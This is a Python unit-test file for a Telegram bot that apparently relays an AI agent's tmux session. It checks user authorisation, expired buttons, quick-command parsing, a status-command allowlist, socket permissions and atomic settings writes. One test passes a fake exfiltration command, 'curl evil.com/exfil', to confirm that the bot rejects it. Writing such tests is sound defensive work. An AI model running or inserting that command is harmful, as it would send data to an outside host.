"""
Security and Concurrency Audit Unit Tests for agy-telegram.
Verifies fixes for P0 blockers, P1 criticals, and P2 architectural requirements.
"""

import asyncio
import os
import tempfile
import unittest
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

from agy_telegram.config import (
    AppConfig,
    TelegramConfig,
    AgentConfig,
    SentinelConfig,
    MirrorConfig,
    load_config,
)
from agy_telegram.core.bot import AgyTelegramBot, TurnContext
from agy_telegram.core.formatter import split_text
from agy_telegram.core.settings_manager import (
    set_current_model,
    get_current_model,
    set_current_mode,
    get_current_mode,
    _atomic_update_settings,
)
from agy_telegram.sentinel.server import SentinelServer


def make_dummy_config(allowed_user_id: int = 12345, status_command: str = None) -> AppConfig:
    return AppConfig(
        telegram=TelegramConfig(bot_token="123456:dummy_token", allowed_users=[allowed_user_id]),
        agent=AgentConfig(status_command=status_command),
        sentinel=SentinelConfig(enabled=False),
        mirror=MirrorConfig(mode="tmux", target_session="test:0.0"),
    )


class TestSecurityAudit(unittest.TestCase):
    def test_unauthorized_callback_rejected(self):
        """Verify that a callback from an unauthorized user is rejected."""
        bot = AgyTelegramBot(make_dummy_config(allowed_user_id=12345))

        mock_update = MagicMock()
        mock_update.effective_user.id = 99999  # Unauthorized
        mock_update.effective_chat.type = "private"
        mock_query = MagicMock()
        mock_query.data = "tmux_key:1:turn123"
        mock_query.answer = AsyncMock()
        mock_update.callback_query = mock_query

        # Mock tmux_mirror
        bot.tmux_mirror.send_raw_key = AsyncMock()

        asyncio.run(bot.handle_callback(mock_update, MagicMock()))

        # send_raw_key must NEVER have been called
        self.assertFalse(bot.tmux_mirror.send_raw_key.called, "Unauthorized users must not send keys to tmux!")
        # Must respond with denial alert
        self.assertTrue(mock_query.answer.called)
        self.assertIn("Access denied", mock_query.answer.call_args[0][0])

    def test_non_private_chat_rejected(self):
        """Verify that any interaction from group or channel is rejected."""
        bot = AgyTelegramBot(make_dummy_config(allowed_user_id=12345))

        mock_update = MagicMock()
        mock_update.effective_user.id = 12345
        mock_update.effective_chat.type = "group"
        self.assertFalse(bot.is_authorized(mock_update))

        mock_update.effective_chat.type = "channel"
        self.assertFalse(bot.is_authorized(mock_update))

        mock_update.effective_chat.type = "supergroup"
        self.assertFalse(bot.is_authorized(mock_update))

        mock_update.effective_chat.type = "private"
        self.assertTrue(bot.is_authorized(mock_update))

    def test_stale_turn_callback_invalidation(self):
        """Verify that inline buttons from previous turns are invalidated."""
        bot = AgyTelegramBot(make_dummy_config(allowed_user_id=12345))

        # Current active turn
        current_turn = TurnContext(
            turn_id="current_id",
            user_id=12345,
            chat_id=12345,
            is_prompt_active=True,
        )
        bot.active_turns[12345] = current_turn
        bot.tmux_mirror.send_raw_key = AsyncMock()

        mock_update = MagicMock()
        mock_update.effective_user.id = 12345
        mock_update.effective_chat.type = "private"
        mock_query = MagicMock()
        # Callback from a previous turn ("old_id" != "current_id")
        mock_query.data = "tmux_key:1:old_id"
        mock_query.answer = AsyncMock()
        mock_query.edit_message_text = AsyncMock()
        mock_update.callback_query = mock_query

        asyncio.run(bot.handle_callback(mock_update, MagicMock()))

        # No key sent to tmux
        self.assertFalse(bot.tmux_mirror.send_raw_key.called, "Stale buttons from previous turns must not send keys!")
        # Must notify that the turn has expired
        self.assertTrue(mock_query.edit_message_text.called)
        self.assertIn("expired", mock_query.edit_message_text.call_args[0][0])

    def test_quick_action_no_substring_hijack(self):
        """Verify that conversational sentences containing keywords do not trigger quick commands."""
        bot = AgyTelegramBot(make_dummy_config(allowed_user_id=12345))
        bot.cmd_new = AsyncMock()
        bot.cmd_abort = AsyncMock()
        bot.cmd_status = AsyncMock()

        # Mock tmux_mirror and send_input
        bot.tmux_mirror.check_session_exists = AsyncMock(return_value=True)
        bot.tmux_mirror.send_input = AsyncMock(return_value=True)
        bot.tmux_mirror.start_turn_monitoring = AsyncMock()

        mock_update = MagicMock()
        mock_update.effective_user.id = 12345
        mock_update.effective_chat.id = 12345
        mock_update.effective_chat.type = "private"
        mock_update.effective_message.reply_text = AsyncMock()
        mock_update.effective_chat.send_action = AsyncMock()

        # Conversational message containing "New"
        mock_update.effective_message.text = "What is the New feature in Python 3.12?"

        asyncio.run(bot.handle_message(mock_update, MagicMock()))

        # Must not have called cmd_new!
        self.assertFalse(bot.cmd_new.called, "Conversational text containing 'New' must not trigger cmd_new!")
        # Must have forwarded the text to tmux
        self.assertTrue(bot.tmux_mirror.send_input.called)
        self.assertEqual(bot.tmux_mirror.send_input.call_args[0][0], "What is the New feature in Python 3.12?")

    def test_pending_prompt_blocks_free_text_input(self):
        """Verify that pending confirmation prompt prevents sending plain text to console."""
        bot = AgyTelegramBot(make_dummy_config(allowed_user_id=12345))
        bot.tmux_mirror.send_input = AsyncMock()

        turn_ctx = TurnContext(
            turn_id="turn_active",
            user_id=12345,
            chat_id=12345,
            is_prompt_active=True,
        )
        bot.active_turns[12345] = turn_ctx

        mock_update = MagicMock()
        mock_update.effective_user.id = 12345
        mock_update.effective_chat.id = 12345
        mock_update.effective_chat.type = "private"
        mock_update.effective_message.text = "ls -la"
        mock_update.effective_message.reply_text = AsyncMock()

        asyncio.run(bot.handle_message(mock_update, MagicMock()))

        # send_input must NOT have been called while prompt is active!
        self.assertFalse(bot.tmux_mirror.send_input.called)
        self.assertTrue(mock_update.effective_message.reply_text.called)
        self.assertIn("Pending Authorization Request", mock_update.effective_message.reply_text.call_args[0][0])

    def test_cmd_status_allowlist_enforcement(self):
        """Verify that cmd_status rejects binaries outside the allowlist."""
        # Config with unauthorized command
        config = make_dummy_config(allowed_user_id=12345, status_command="curl evil.com/exfil")
        bot = AgyTelegramBot(config)
        bot.reply_safe = AsyncMock()

        mock_update = MagicMock()
        mock_update.effective_user.id = 12345
        mock_update.effective_chat.type = "private"
        mock_update.effective_chat.send_action = AsyncMock()

        asyncio.run(bot.cmd_status(mock_update, MagicMock()))

        # Must have rejected execution
        self.assertTrue(bot.reply_safe.called)
        reply_text = bot.reply_safe.call_args[0][1]
        self.assertIn("Unauthorized status binary", reply_text)
        self.assertIn("curl", reply_text)

    def test_sentinel_socket_permissions_and_creation(self):
        """Verify that the UNIX socket is created with 0o600 restrictive permissions."""
        with tempfile.TemporaryDirectory() as tmpdir:
            sock_path = os.path.join(tmpdir, "test-sentinel.sock")
            server = SentinelServer(socket_path=sock_path)

            async def run_server():
                await server.start()
                self.assertTrue(os.path.exists(sock_path))
                # Verify file permissions
                mode = os.stat(sock_path).st_mode & 0o777
                self.assertEqual(mode, 0o600, "UNIX socket must have restrictive 0o600 permissions!")
                await server.stop()

            asyncio.run(run_server())

    def test_sentinel_socket_occupied_refuses_to_steal(self):
        """Verify that starting SentinelServer raises an error if another instance is listening."""
        with tempfile.TemporaryDirectory() as tmpdir:
            sock_path = os.path.join(tmpdir, "test-sentinel-busy.sock")
            server1 = SentinelServer(socket_path=sock_path)
            server2 = SentinelServer(socket_path=sock_path)

            async def run_test():
                await server1.start()
                with self.assertRaises(RuntimeError):
                    await server2.start()
                await server1.stop()

            asyncio.run(run_test())

    def test_split_text_balanced_html(self):
        """Verify that split_text balances pre/code tags across consecutive chunks."""
        code_body = "x = 42\n" * 400  # Approx 2800 chars
        long_html = f'<pre class="language-python"><code>{code_body}\n{code_body}</code></pre>'

        chunks = split_text(long_html, max_chunk=2000)
        self.assertGreater(len(chunks), 1, "Text should be split into multiple chunks.")

        # First chunk must close pre/code tags
        self.assertTrue(chunks[0].endswith("</code></pre>"), "First chunk must end with </code></pre>")
        # Next chunk must reopen pre/code
        self.assertTrue(chunks[1].startswith('<pre class="language-python"><code>'), "Next chunk must reopen <pre><code>")

    def test_atomic_settings_update(self):
        """Verify that updating settings.json is atomic and safe."""
        with tempfile.TemporaryDirectory() as tmpdir:
            test_settings = Path(tmpdir) / "settings.json"
            with patch("agy_telegram.core.settings_manager.resolve_settings_path", return_value=test_settings):
                ok1 = set_current_model("Claude Sonnet 4.6 (Thinking)")
                self.assertTrue(ok1)
                self.assertEqual(get_current_model(), "Claude Sonnet 4.6 (Thinking)")

                ok2 = set_current_mode("accept-edits")
                self.assertTrue(ok2)
                self.assertEqual(get_current_mode(), "accept-edits")

                # Verify both fields are present in the final JSON file
                import json
                with open(test_settings, "r", encoding="utf-8") as f:
                    data = json.load(f)
                self.assertEqual(data["model"], "Claude Sonnet 4.6 (Thinking)")
                self.assertEqual(data["mode"], "accept-edits")

    def test_atomic_settings_corrupted_backup(self):
        """Verify that corrupted settings.json triggers backup and raises error instead of overwrite."""
        with tempfile.TemporaryDirectory() as tmpdir:
            test_settings = Path(tmpdir) / "settings.json"
            test_settings.write_text("{ this is corrupted invalid json :", encoding="utf-8")

            with patch("agy_telegram.core.settings_manager.resolve_settings_path", return_value=test_settings):
                with self.assertRaises(ValueError):
                    _atomic_update_settings("model", "TestModel")

                bak_path = Path(tmpdir) / "settings.json.bak"
                self.assertTrue(bak_path.is_file(), "Backup file settings.json.bak must be created!")
                self.assertEqual(bak_path.read_text(encoding="utf-8"), "{ this is corrupted invalid json :")

    def test_load_config_nonexistent_file_raises_filenotfound(self):
        """Verify that load_config raises FileNotFoundError when explicitly given non-existent path."""
        from agy_telegram.config import load_config
        with self.assertRaises(FileNotFoundError):
            load_config(config_path="/tmp/non_existent_agy_config_file_12345.toml")

    def test_load_config_empty_allowed_users_raises_valueerror(self):
        """Verify that load_config raises ValueError if allowed_users is empty."""
        from agy_telegram.config import load_config
        with tempfile.TemporaryDirectory() as tmpdir:
            cfg_file = Path(tmpdir) / "config.toml"
            cfg_file.write_text(
                '[telegram]\nbot_token = "dummy:token"\nallowed_users = []\n',
                encoding="utf-8",
            )
            with patch.dict(os.environ, {}, clear=True):
                with self.assertRaises(ValueError) as ctx:
                    load_config(config_path=cfg_file)
                self.assertIn("allowed_users", str(ctx.exception))


if __name__ == "__main__":
    unittest.main()

